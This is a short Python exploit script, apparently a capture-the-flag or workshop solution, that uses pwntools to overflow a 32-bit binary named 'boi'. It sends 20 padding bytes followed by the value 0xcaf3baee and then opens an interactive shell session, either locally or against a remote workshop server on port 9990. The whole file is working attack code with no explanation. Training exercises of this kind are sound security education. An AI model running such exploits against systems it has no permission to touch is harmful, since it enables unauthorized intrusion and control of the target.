#!/usr/bin/env python3

from pwn import context
from pwn import remote
from pwn import process
from pwn import p32


def get_payload() -> bytes:
    offset = 20
    padding = b'\x41' * offset
    value = p32(0xcaf3baee, endian='little')
    return padding + value


def exploit_local() -> None:
    context.arch = 'i386'
    context.os = 'linux'
    context.endian = 'little'
    context.word_size = '32'
    context.log_level = 'DEBUG'

    binary = process('./boi')
    print(binary.read())
    payload = get_payload()
    binary.send(payload)
    binary.interactive()


def exploit_remote() -> None:
    connection = remote('workshop.faust.ninja', 9990)
    print(connection.recvline())
    payload = get_payload()
    connection.send(payload)
    connection.interactive()


exploit_local()
